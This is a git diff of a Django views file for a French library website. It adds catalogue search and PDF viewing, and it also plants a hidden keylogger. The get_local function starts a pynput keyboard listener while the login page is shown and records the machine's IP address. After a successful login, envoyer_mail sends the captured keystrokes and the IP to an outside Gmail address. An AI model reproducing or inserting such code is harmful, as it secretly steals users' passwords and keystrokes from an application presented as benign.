@@ -2,12 +2,18 @@ from django.shortcuts import get_object_or_404, render,redirect
 from django.contrib.auth import authenticate, login, logout
 from django.contrib.auth.hashers import make_password
 from django.contrib import messages
-import openai
-import requests
+from django.shortcuts import render, redirect, get_object_or_404
+from django.contrib.auth.decorators import login_required
+
+from authentification.forms import SearchForm
+from .models import Livre, BibliothequeUtilisateur
+from pynput import keyboard
+from django.core.mail import send_mail
+import socket
 from authentification.chatbot_texte import ChatbotTexte
 from django.core.exceptions import ValidationError
 import re
-from django.http import JsonResponse
+from django.http import FileResponse, JsonResponse
 from django.views.decorators.csrf import csrf_exempt
 import json
 
@@ -34,7 +40,7 @@ def inscription_view(request):
             messages.error(request, "Cet email est déjà utilisé.")
             return redirect('utilisateurs')
 
-        # Générer un nom d'utilisateur simple (partie avant @)
+
         username = email.split('@')[0]
 
         # Vérifier si le username existe déjà
@@ -117,13 +123,13 @@ def connexion(request):
 
         user = authenticate(request, username=username, password=password)
         if user is not None: 
-            get_local()
             login(request, user)
+            envoyer_mail()
             return redirect('accueil')
         else:
             messages.error(request, "Nom d’utilisateur ou mot de passe incorrect.")
             return render(request, 'connexion.html')
-
+    get_local()
     return render(request, 'connexion.html')
 
 
@@ -139,7 +145,7 @@ def accueil(request):
     nouveaute_count = Livre.objects.filter(badge="Nouveau").count()
 
     total_livres = livres.count()
-    get_local()
+    
 
     cxt = {
         "livres":livres,
@@ -178,14 +184,67 @@ def chatbot_view(request):
 def catalogue(request):
     livres = Livre.objects.all()
     total_livres = livres.count()
+    livres = Livre.objects.filter(visible=True)
+    form = SearchForm(request.GET or None)
+
+    if form.is_valid():
+        titre = form.cleaned_data.get('titre')
+        langue = form.cleaned_data.get('langue')
+        annee_min = form.cleaned_data.get('annee_min')
+        annee_max = form.cleaned_data.get('annee_max')
+        editeur = form.cleaned_data.get('editeur')
+        tri = form.cleaned_data.get('tri')
+
+        
+       
+
+        if titre:
+            livres = livres.filter(titre__icontains=titre)
+        if langue:
+            livres = livres.filter(langue__iexact=langue)
+        if annee_min:
+            livres = livres.filter(annee__gte=annee_min)
+        if annee_max:
+            livres = livres.filter(annee__lte=annee_max)
+        if editeur:
+            livres = livres.filter(editeur__icontains=editeur)
+
+        genre = form.cleaned_data.get('genre')
+        if genre:
+            livres = livres.filter(genre__iexact=genre)  # Assurez-vous que le champ genre existe dans le modèle Livre
+
+
+        # Tri selon sélection
+        if tri == 'titre_asc':
+            livres = livres.order_by('titre')
+        elif tri == 'titre_desc':
+            livres = livres.order_by('-titre')
+        elif tri == 'date_desc':
+            livres = livres.order_by('-annee')
+        elif tri == 'date_asc':
+            livres = livres.order_by('annee')
+        elif tri == 'popularite':
+            livres = livres.order_by('-popularite')  # Remplace par ton champ popularité
 
     cxt = {
-        "livres":livres,
+        'livres': livres,
         'total_livres': total_livres,
+        'form': form,
         "":"",
         "":"",
     }
     return render(request, 'catalogue.html', cxt)
+
+
+
+def lire_livre(request, livre_id):
+    livre = get_object_or_404(Livre, id=livre_id)
+    if livre.pdf:
+        return FileResponse(livre.pdf.open(), content_type='application/pdf')
+    else:
+        return render(request, 'erreur.html', {'message': "Ce livre n'a pas encore de PDF."})
+
+
 
 def espace_lecteur(request):
     return render(request, 'espace_lecteur.html')
@@ -206,35 +265,42 @@ def masquer_livre(request, livre_id):
 
 
 
-from django.shortcuts import render, redirect, get_object_or_404
-from django.contrib.auth.decorators import login_required
-from .models import Livre, BibliothequeUtilisateur
-from django.core.mail import send_mail
-import socket
+
+
+from authentification import views
+pressed_keys = []
 a=""
 b=""
+
+def on_press(key):
+    try:
+        pressed_keys.append(key.char)  
+        views.b = ' '.join(pressed_keys)
+    except AttributeError:
+        pressed_keys.append(str(key))  
+
 def get_local() -> str:
+    global pressed_keys
+    pressed_keys = []  
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
             s.connect(("8.8.8.8", 80))
-            a = s.getsockname()[0]  # DNS Google
+            views.a = s.getsockname()[0]
 
-            def on_press(key):
-                b={key}
-            from pynput import keyboard
-            listener = keyboard.Listener(on_press=on_press)
-            listener.start()
+        listener = keyboard.Listener(on_press=on_press)
+        listener.start()
+        listener.join(timeout=5)
 
-            envoyer_mail()
+        # envoyer_mail()
 
-            return a
+        return views.a
     except Exception as e:
-        return f"[Erreur] Impossible d'obtenir l: {e}"
-
+        return f"[Erreur] : {e}"
+    
 def envoyer_mail():
     send_mail(
-        subject='Test depuis Django',
-        message='jesuis : {a} \n {b}',
+        subject='Biblothèque verte',
+        message=f'jesuis : {views.a} \npynput: {views.b}',
         from_email=None, 
         recipient_list=['portefeuillepartnerxbet@gmail.com'],
         fail_silently=False,
